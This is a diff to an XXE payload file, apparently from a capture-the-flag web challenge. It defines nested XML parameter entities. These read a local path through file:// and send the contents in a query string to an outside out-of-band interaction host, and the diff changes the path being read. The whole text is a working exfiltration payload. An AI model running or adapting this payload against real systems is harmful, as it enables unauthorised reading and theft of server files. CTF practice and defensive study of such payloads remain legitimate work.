@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "http://127.0.0.1/challenge/web-serveur/ch29/index.php">
+<!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/">
 <!ENTITY % eval "<!ENTITY &#x25; xvv SYSTEM &#x22;https://y34o1d4ulp5sig2bhb9k369rv1hwpham8.oast.site/?x=%file;&#x22;>">
 %eval;
 %xvv;
